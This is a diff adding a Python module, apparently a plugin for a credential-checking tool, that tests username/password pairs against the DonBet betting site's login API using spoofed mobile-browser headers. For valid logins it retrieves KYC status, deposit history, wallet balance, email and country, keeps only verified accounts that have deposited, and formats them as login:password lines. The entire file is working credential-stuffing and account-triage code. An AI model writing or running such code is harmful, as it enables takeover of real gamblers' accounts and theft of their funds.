@@ -1,0 +1,81 @@
+from core.base_checker import BaseChecker
+from typing import Dict, Any
+import requests
+
+class DonbetChecker(BaseChecker):
+    """DonBet site checker"""
+    
+    LOGIN_URL = "https://m.donbet.com/api/profile/login"
+    PROFILE_URL = "https://m.donbet.com/api/profile/p/getprofile"
+    WALLET_URL = "https://m.donbet.com/api/profile/p/getwallets"
+    
+    HEADERS = {
+  "authority": "m.donbet.com",
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/json",
+    "origin": "https://m.donbet.com",
+    "referer": "https://m.donbet.com/en/account/nav",
+    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+    "sec-ch-ua-mobile": "?1",
+    "sec-ch-ua-platform": '"Android"',
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+}
+    
+    def check_account(self, username: str, password: str) -> Dict[str, Any]:
+        """Check single DonBet account"""
+        try:
+            session = requests.Session()
+            session.headers.update(self.HEADERS)
+            
+            # Login
+            payload = {"UserName": username, "Password": password, "ConfirmationStatus": None}
+            resp = session.post(self.LOGIN_URL, json=payload, timeout=15)
+            
+            if resp.status_code != 200:
+                return {"status": "bad", "username": username}
+            
+            data = resp.json()
+            if data.get("status") != 1:
+                return {"status": "bad", "username": username}
+
+            # Get profile and wallet
+            profile = session.get(self.PROFILE_URL, timeout=15).json()
+            wallet = session.get(self.WALLET_URL, timeout=15).json()
+            wallet_info = wallet[0] if wallet else {}
+
+            kyc_status = profile.get("KYCStatus", False)
+            deposited_before = profile.get("Deposited", False)
+            
+            account_data = {
+                "login": username,
+                "password": password,
+                "kyc_status": kyc_status,
+                "deposited_before": deposited_before,
+                "balance": wallet_info.get("Balance", 0),
+                "email": data.get("response", {}).get("Email", ""),
+                "country": profile.get("CountryId", "")
+            }
+            
+            return {
+                "status": "valid",
+                "account_data": account_data,
+                "should_save": self.should_save(account_data)
+            }
+            
+        except Exception as e:
+            return {"status": "error", "username": username, "error": str(e)}
+    
+    def should_save(self, account_data: Dict[str, Any]) -> bool:
+        """Save if KYC verified AND deposited"""
+        return account_data.get("kyc_status", False) and account_data.get("deposited_before", False)
+    
+    def save_format(self, account_data: Dict[str, Any]) -> str:
+        """Format DonBet account data"""
+        return f"{account_data['login']}:{account_data['password']} | " \
+               f"kyc_status={account_data['kyc_status']} | " \
+               f"deposited_before={account_data['deposited_before']} | " \
+               f"balance={account_data['balance']}\n"
